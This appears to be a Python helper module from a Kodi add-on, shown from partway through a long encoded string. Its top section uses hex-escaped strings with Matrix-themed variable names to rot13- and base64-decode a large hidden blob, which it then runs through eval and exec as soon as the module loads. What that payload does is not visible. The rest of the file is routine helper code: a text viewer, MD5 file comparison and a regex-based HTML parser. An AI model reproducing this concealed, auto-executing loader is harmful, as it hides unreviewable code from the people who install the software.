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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False

def inproplist(my_list, item):
    if item in my_list:
        return True
    else:
        return any(inproplist(sublist, item) for sublist in my_list if isinstance(sublist, list))

def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

